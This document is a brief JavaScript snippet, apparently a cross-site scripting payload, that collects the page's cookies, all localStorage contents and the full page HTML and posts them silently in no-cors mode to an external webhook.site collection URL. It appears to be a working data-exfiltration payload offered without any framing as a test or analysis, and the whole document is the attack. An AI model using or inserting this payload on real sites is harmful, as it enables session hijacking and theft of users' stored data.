(() => {
  const data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    html: document.documentElement.outerHTML,
  };

  fetch("https://webhook.site/c5079879-5004-461c-93d5-99e88be89a50", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
})();
